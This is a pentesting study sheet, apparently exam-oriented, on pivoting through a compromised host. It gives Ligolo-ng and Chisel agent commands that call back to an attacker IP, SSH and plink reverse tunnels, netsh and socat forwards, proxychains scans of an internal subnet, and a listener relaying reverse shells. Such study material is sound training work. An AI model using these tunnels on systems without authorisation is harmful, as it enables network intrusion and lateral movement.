# Pivoting & Tunneling

Once you own a host with a second network interface, use it as a jump box to reach hosts you can't touch directly. On the exam the AD set usually requires pivoting from the first machine.

**Recon the pivot host first:**
```bash
ip a; route -n; arp -a               # Linux
ipconfig /all; route print; arp -a   # Windows
# find the new subnet, then scan it THROUGH the pivot
```

---

## Ligolo-ng (recommended — clean, fast, TUN-based)

Feels like the pivot host is just another route on your machine. No proxychains needed.

```bash
# --- on ATTACKER ---
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert                      # start the listener (default :11601)

# --- on TARGET (pivot host) --- transfer the agent, then:
./agent -connect YOUR_IP:11601 -ignore-cert      # Linux
agent.exe -connect YOUR_IP:11601 -ignore-cert    # Windows

# --- back in the proxy console ---
session                                # pick the agent
# then add a route to the internal subnet:
# (in another terminal) sudo ip route add 172.16.1.0/24 dev ligolo
start                                  # start the tunnel
# now scan/attack 172.16.1.0/24 directly from your box
```
Reverse/local port forwards for callbacks back to you:
```
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444   # target:4444 → your:4444 (catch revshells from internal hosts)
```

---

## Chisel (SOCKS proxy — very common, works everywhere)

```bash
# --- ATTACKER (server) ---
./chisel server -p 8000 --reverse

# --- TARGET (client) --- creates a reverse SOCKS5 proxy on attacker:1080
./chisel client YOUR_IP:8000 R:socks

# --- use it ---
# add to /etc/proxychains4.conf:  socks5 127.0.0.1 1080
proxychains nmap -sT -Pn -n 172.16.1.5
proxychains evil-winrm -i 172.16.1.5 -u user -p pass
```
Single-port forward instead of SOCKS: `./chisel client YOUR_IP:8000 R:3389:172.16.1.5:3389` → RDP to internal host via `localhost:3389`.

---

## SSH tunneling (when you have SSH creds)

```bash
# Local forward: reach internal:port via your localhost:LPORT
ssh -L 8080:172.16.1.5:80 user@$IP            # your :8080 → internal :80

# Dynamic (SOCKS proxy) — reach the whole internal net
ssh -D 1080 user@$IP                          # then proxychains ... via socks5 127.0.0.1 1080

# Remote forward: expose a service on YOUR box to the target side
ssh -R 4444:127.0.0.1:4444 user@$IP

# You have creds but SSH is only internal? use -J (jump) chaining, or the above.
```

---

## proxychains

```bash
# /etc/proxychains4.conf (bottom):
#   socks5 127.0.0.1 1080
# use socks4 for older chisel; enable quiet_mode; prefer -sT (full connect) scans
proxychains -q nmap -sT -Pn -p 22,80,445 172.16.1.5
proxychains -q smbclient -L //172.16.1.5/ -U user
```
Note: proxychains only handles TCP; use `-sT` (never `-sS`) and skip ICMP (`-Pn`).

---

## Windows-native forwarding (no tools)

```cmd
:: netsh portproxy — forward attacker→internal through a Windows pivot
netsh interface portproxy add v4tov4 listenport=3389 listenaddress=0.0.0.0 connectport=3389 connectaddress=172.16.1.5
netsh interface portproxy show all
netsh interface portproxy delete v4tov4 listenport=3389 listenaddress=0.0.0.0
:: remember to open the firewall port if needed
```

## plink / socat (fallbacks)

```bash
# socat local port forward on a Linux pivot
socat TCP-LISTEN:8080,fork,reuseaddr TCP:172.16.1.5:80
# plink reverse tunnel from a Windows pivot (old but works)
plink.exe -R 4444:127.0.0.1:4444 user@YOUR_IP
```

---

## Workflow summary

1. Own host A → recon its extra interface/subnet.
2. Stand up a tunnel: **Ligolo-ng** (best) or **Chisel SOCKS** (universal) or **SSH -D** (if creds).
3. Scan the internal subnet **through** the tunnel (`-sT -Pn`).
4. Attack internal hosts as if local (Ligolo) or via proxychains (Chisel/SSH).
5. Set up a **reverse** listener/forward so internal hosts can send shells back to you.
